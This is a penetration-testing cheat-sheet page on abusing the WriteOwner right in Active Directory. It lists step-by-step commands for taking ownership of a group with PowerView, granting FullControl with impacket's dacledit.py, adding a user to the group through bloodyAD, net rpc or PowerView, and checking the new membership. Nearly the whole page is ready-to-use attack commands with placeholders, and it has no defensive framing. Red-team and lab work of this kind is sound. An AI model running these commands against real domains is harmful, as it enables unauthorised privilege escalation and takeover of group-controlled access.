---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit"]
---

### Abuse #1 : Change owner of the group

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Change owner

```console
Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <TARGET_USER>
```

{{< /tabcontent >}}

### Abuse #2 : Add user to the group

{{< tab set2 tab1 active >}}Linux{{< /tab >}}{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{<  tabcontent set2 tab1  >}}

#### 0. Install latest impacket (included dacledit.py)

```console
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
pip3 install .
```

#### 1. Add full control permission to the user over the group

```console
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -inheritance -action write -rights FullControl
```

#### 2. Add the user to group

{{< tab set3 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set3 tab2 >}}rpc{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
python3 bloodyAD.py -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<TARGET_GROUP>' '<USER>'
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
kinit <USER>
```

```console
sudo ntpdate -s <DC> && net rpc group addmem '<TARGET_GROUP>' '<USER>' -U '<USER>' --use-kerberos=required -S <DC> --no-pass
```

{{< /tabcontent >}}

#### 3. Check

```console
sudo ntpdate -s <DC> && net rpc group members '<TARGET_GROUP>' -U '<USER>' --use-kerberos=required -S <DC> --no-pass
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add user to group

```console
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```console
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

#### 4. Check

```console
Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```console
# Or
net user <USER>
```

```console
# Exit current sessions or re-login
whoami /groups
```

{{< /tabcontent >}}
